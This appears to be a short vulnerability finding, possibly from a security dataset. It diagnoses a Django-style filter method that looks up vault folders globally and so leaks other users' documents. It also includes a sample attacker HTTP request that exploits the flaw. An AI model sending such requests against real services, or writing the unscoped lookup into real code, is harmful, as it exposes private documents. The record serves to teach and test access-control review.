diagnosis: The filterset defines a custom method filter_by_folder that fetches VaultFolder.objects.get(id=value) globally and returns folder.documents.all(). This replaces the user-scoped queryset passed into the method, leaking all documents inside arbitrary vault folders.
exploit_request:
GET /api/vault/documents/?folder_id=774 HTTP/1.1
Host: vault.example.com
Authorization: Bearer <attacker_jwt>
